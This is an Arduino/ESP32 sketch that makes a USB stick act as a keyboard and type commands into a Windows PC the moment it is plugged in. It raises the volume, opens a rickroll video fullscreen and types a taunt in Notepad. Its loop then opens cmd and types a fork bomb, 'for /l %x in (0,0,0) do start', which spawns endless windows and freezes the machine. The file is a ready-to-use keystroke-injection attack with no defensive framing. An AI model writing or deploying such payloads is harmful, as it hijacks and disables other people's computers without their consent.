#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;
USBHID HID;
// #define KEY_UP     0x52
// #define KEY_DOWN   0x51
// #define KEY_LEFT   0x50
// #define KEY_RIGHT  0x4F

#define KEY_RIGHT 0x4f // Keyboard Right Arrow
#define KEY_LEFT 0x50 // Keyboard Left Arrow
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_UP 0x52 // Keyboard Up Arrow

void setup() {
  USB.begin();
  HID.begin();
  Keyboard.begin();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI); // Win + R
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("sndvol");
  delay(2000);
  for (int i=0; i<100; i++) {
    Keyboard.write(KEY_UP);
    delay(30);
  }
  //   for (int i=0; i<50; i++) {
  //   ConsumerControl.press(KEYBOARD_UP_ARROW);
  //   delay(50);
  //   ConsumerControl.release();
  //   delay(50);
  // }

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  delay(5000);
  Keyboard.write('f'); // fullscreen
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("notepad");
  delay(5000);
  Keyboard.println("but it will come in handy someday...");
}

void loop() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("cmd");
  delay(2000);
  Keyboard.println("MODE CON: COLS=15 LINES=1");
  Keyboard.println("COLOR EF");
  Keyboard.println(F("for /l %x in (0,0,0) do start"));
  for(;;) {}
}
